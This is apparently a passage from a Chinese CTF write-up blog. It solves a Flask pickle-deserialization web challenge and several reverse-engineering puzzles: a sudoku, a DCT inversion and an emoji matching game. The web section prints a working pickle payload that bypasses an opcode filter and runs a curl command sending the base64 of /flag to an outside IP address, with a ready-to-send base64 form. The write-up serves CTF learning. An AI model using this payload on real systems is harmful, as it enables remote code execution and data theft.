id="easypy"><a href="#easypy" class="headerlink" title="easypy"></a>easypy</h3><p>扫描得到目录 <code>/download</code>，访问下载 <code>www.zip</code>，里面真正的代码在 <code>app.cpython-38.pyc</code>，反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: app.cpython-38.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;小p想要找一个女朋友，你能帮他找找看么？&#x27;</span></span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriends</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        numpydata = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">and</span> <span class="string">b&#x27;bash&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> numpydata:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;不能走捷径啊&#x27;</span></span><br><span class="line">        resp = <span class="literal">None</span>.loads(numpydata)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;可以的，要的就是一种感觉&#x27;</span></span><br><span class="line"></span><br><span class="line">girlfriends = app.route(<span class="string">&#x27;/girlfriends&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(girlfriends)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">download = app.route(<span class="string">&#x27;/download&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(download)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察到路由 <code>/girlfriends?data=</code>，需提供opcode来RCE，但不能包含 <code>R</code> 字符，参考文章，还可以使用 <code>i</code> 或 <code>o</code> 字符实现RCE，而禁用了 <code>sh</code>，不好实现反弹shell，用curl命令外带flag值到vps即可：</p><p>vps：<code>python3 -m http.server 10010</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;curl http://120.25.104.209:10010?`base64 /flag`&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>对应base64：<code>KFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h3><blockquote><p>数字游戏！</p></blockquote><p>看反编译代码盲猜为数独游戏，对用户输入的数独矩阵进行求解，并输出解密后的flag在每一次循环中，读取玩家输入的数独矩阵并寻找空着的位置，接收到一个输入数字后，判断其是否合法，如果合法则填充进矩阵中，并对其求和。如果求解成功，则输出flag。</p><p>使用在线数独求解器，将填入数字连成字符串 <code>468912723481342575971422657913948591537428763345261</code>输入得到flag：<code>flag&#123;bbcbff5c1f1ded46c25d28119a85c6c2&#125;</code>。</p><p>​    </p><h3 id="BWBA"><a href="#BWBA" class="headerlink" title="BWBA"></a>BWBA</h3><blockquote><p>一位85岁老大爷于今年考入大学的计算机科学与技术专业，在第一年的学习中学到了高等数学、离散数学、C++等，下面是大爷编写的一道程序，请破解大爷写的程序</p></blockquote><p> <code>encrypt()</code> 加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v7; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+23h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::size(a2);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::allocator(&amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(a1, v9, <span class="number">0LL</span>, &amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v9; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](a2, j);</span><br><span class="line">      v6 = <span class="built_in">cos</span>((j + <span class="number">0.5</span>) * (<span class="number">3.141592653589793</span> * i) / v9) * v5;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">      *v2 = *v2 + v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">2.0</span> / v9);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">1.0</span> / v9);</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">    *v3 = *v3 * v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>识别代码逻辑为离散余弦变换(DCT)算法，写一个逆算法解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;370.75 234.362 -58.0834 59.8212 88.8221 -30.2406 21.8316 49.9781 -33.5259 2.69675 43.5386 -30.2925 -28.0754 27.593 -2.53962 -27.1883 -5.60777 -0.263937 6.80326 8.03022 -6.34681 -0.89506 -6.80685 -13.6088 27.0958 29.8439 -21.7688 -20.6925 -13.2155 -37.0994 2.23679 37.6699 -3.5 9.85188 57.2806 13.5715 -20.7184 8.6816 3.59369 -4.5302 4.22203 -28.8166 -23.695 31.2268 6.58823 -39.9966 -20.7877 -19.7624 -22.031 16.3285 2.07557 -26.2521 16.1914 18.3976 -26.9295 3.03769 41.0412 20.2598 14.991 6.99392 -22.3752 -7.24466 8.96299 -10.4874&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c = [<span class="built_in">float</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">idct</span>(<span class="params">signal</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform Inverse Discrete Cosine Transform (IDCT) on signal&quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(signal)</span><br><span class="line">    x = np.zeros(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                y += signal[j] / np.sqrt(n)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y += signal[j] * np.sqrt(<span class="number">2</span>/n) * np.cos((np.pi*(<span class="number">2</span>*i+<span class="number">1</span>)*j)/(<span class="number">2</span>*n))</span><br><span class="line">        x[i] = y</span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">round</span>(x).tolist()</span><br><span class="line"></span><br><span class="line">out = idct(c)</span><br><span class="line">out = [<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> out]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;9ab488a7-5b11-1b15-04f2-c230704ecf72&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Emoji-Connect"><a href="#Emoji-Connect" class="headerlink" title="Emoji Connect"></a>Emoji Connect</h3><blockquote><p>连连看</p></blockquote><p>使用ILSpy分析Game模块，内含48*48 emoji表情矩阵，关键逻辑：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] number = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">48</span>]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>,</span><br><span class="line">    <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>,</span><br><span class="line">    <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>,</span><br><span class="line">    <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>,</span><br><span class="line">    <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Select_Unit</span>(<span class="params">Range Target</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;Range&gt; list = <span class="keyword">new</span> List&lt;Range&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (Range cell <span class="keyword">in</span> Target.Cells)</span><br><span class="line">    &#123;</span><br><span class="line">        list.Add(cell);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((Target.Cells.Count == <span class="number">2</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span>) &amp;&amp; (((<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) == (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)) ? <span class="literal">true</span> : <span class="literal">false</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span>[] array = ((IEnumerable&lt;<span class="built_in">char</span>&gt;)(<span class="built_in">string</span>)(<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)).Select((Func&lt;<span class="built_in">char</span>, <span class="built_in">int</span>&gt;)((<span class="built_in">char</span> c) =&gt; c)).ToArray();</span><br><span class="line">        <span class="built_in">int</span> num = (array[<span class="number">0</span>] - <span class="number">55296</span>) * <span class="number">1024</span> + array[<span class="number">1</span>] - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span>;</span><br><span class="line">        number[num] -= (list[<span class="number">1</span>].Row - <span class="number">1</span>) * (list[<span class="number">1</span>].Column - <span class="number">1</span>);</span><br><span class="line">        number[num] -= (list[<span class="number">0</span>].Row - <span class="number">1</span>) * (list[<span class="number">0</span>].Column - <span class="number">1</span>);</span><br><span class="line">        Range range = list[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">object</span> missing = Type.Missing;</span><br><span class="line">        <span class="built_in">object</span> obj;</span><br><span class="line">        list[<span class="number">1</span>].set_Value(Type.Missing, obj = <span class="string">&quot;\ud83d\udca5&quot;</span>);</span><br><span class="line">        range.set_Value(missing, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="built_in">dynamic</span>)sheet1.Cells[i + <span class="number">1</span>, j + <span class="number">1</span>]).Value != <span class="string">&quot;\ud83d\udca5&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MessageBox.Show(Encoding.ASCII.GetString(number.Select((<span class="built_in">int</span> n) =&gt; (<span class="built_in">byte</span>)n).ToArray()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每选中相同的两个emoji，按照emoji对应的array值，将number数组里对应下标的值，减去选中的两个emoji所在的行列号之积。</p><p>上脚本模拟：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line">s = [[</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span 